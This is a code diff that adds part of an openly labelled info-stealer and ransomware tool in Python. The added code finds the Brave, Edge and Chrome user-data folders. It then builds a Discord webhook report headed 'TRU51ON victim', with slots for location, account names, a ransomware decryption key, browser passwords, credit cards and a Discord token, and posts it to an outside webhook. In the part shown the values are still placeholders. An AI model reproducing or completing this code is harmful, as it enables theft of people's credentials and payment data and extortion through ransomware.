@@ -6,6 +6,77 @@ from cryptography.fernet import Fernet
 webhook = ''
 
 ## Info stealer ##
+class Browsers:
+    def __init__(self):
+        self.appdata = os.getenv('LOCALAPPDATA')
+        self.browsers = {
+            'brave': os.path.join(self.appdata, 'BraveSoftware', 'Brave-Browser', 'User Data'),
+            'edge': os.path.join(self.appdata, 'Microsoft', 'Edge', 'User Data'),
+            'chrome': os.path.join(self.appdata, 'Google', 'Chrome', 'User Data'),
+        }
+
+        self.profiles = (
+            'Default',
+            'Profile 1',
+            'Profile 2'
+        )
+
+    def iterate_items(self): 
+        for _, path in self.browsers.items():
+            if os.path.exists(path):
+                yield path
+
+# Create an instance of the class
+browser_instance = Browsers()
+
+# Call the iterate_items method
+browser_paths = list(browser_instance.iterate_items())
+
+data = {
+    "username" : "Karin van de administratie"
+}
+
+data["embeds"] = []
+
+data["embeds"].append({
+    "title" : "TRU51ON victim: ",
+    "color": "14177041"
+})
+
+# Adding fields
+fields = [
+    {
+        "name": ":pushpin: Country",
+        "value": "Hi, from <flag>"
+    },
+    {
+        "name": ":old_man: **About me**",
+        "value": f"```Country: ...\nDisplay name: ... \nUsername: ...```",
+    },
+    {
+        "name": ":lock: **Ransomware**",
+        "value": f"```Decryption key:\n...```",
+    },
+    {
+        "name": ":globe_with_meridians: **Browser foundings**",
+        "value": f"```Usernames and passwords:\n...\n\nCredit Cards:\n...```",
+    },
+    {
+        "name": ":robot: Botnet attendant token:",
+        "value": f"```Discord token: ...```",
+    }
+]
+
+data["embeds"][0]["fields"] = fields
+
+# Send the data to the webhook
+result = requests.post(webhook, json=data)
+try:
+    result.raise_for_status()
+except requests.exceptions.HTTPError as err:
+    print(err)
+else:
+    print("Payload delivered successfully, code {}.".format(result.status_code))
 
 
 ## Ransomware ##
